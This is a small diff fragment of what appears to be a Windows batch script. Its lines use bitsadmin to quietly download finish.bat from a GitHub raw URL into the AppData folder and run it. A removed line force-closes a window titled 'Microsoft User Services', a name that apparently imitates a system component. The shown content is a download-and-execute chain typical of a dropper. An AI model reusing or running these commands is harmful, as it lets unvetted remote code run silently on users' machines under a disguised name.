@@ -12,5 +12,3 @@ bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/S
 
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/finish.bat" "%AppData%\finish.bat"
 start finish.bat
-
-taskkill /fi "WINDOWTITLE eq Microsoft User Services" /f >nul 2>&1
